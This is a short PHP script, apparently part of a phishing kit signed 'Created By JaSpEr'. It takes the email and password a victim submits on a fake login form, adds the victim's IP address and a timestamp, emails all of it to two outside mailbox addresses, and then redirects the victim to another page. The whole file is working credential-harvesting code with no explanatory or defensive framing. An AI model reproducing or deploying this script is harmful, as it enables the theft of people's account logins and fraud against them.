<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['Email'];
$pass1 = $_POST['Password'];
$chaseme="richardsmith292929@gmail.com,richardsmith292929@yandex.com";


  $subj = "[ST] JaSpEr $ip";
  $msg = "ST Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaSpEr\n-----------------------------------";
  $from = "From: <ST->";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: stewartforeverfarm.php");